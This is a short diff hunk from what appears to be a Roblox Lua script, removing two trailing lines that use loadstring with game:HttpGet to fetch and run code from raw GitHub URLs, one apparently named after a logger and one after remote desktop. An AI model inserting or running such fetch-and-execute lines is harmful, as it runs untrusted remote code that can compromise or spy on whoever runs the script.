@@ -89,6 +89,3 @@ spawn(function()
     end)
 end)
 
-
- loadstring(game:HttpGet("https://raw.githubusercontent.com/bphuc734/ngrokL53doDlWFDgjhZZCu/refs/heads/main/log.txt"))()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/bphuc734/WIN10RDP/refs/heads/main/candy"))()
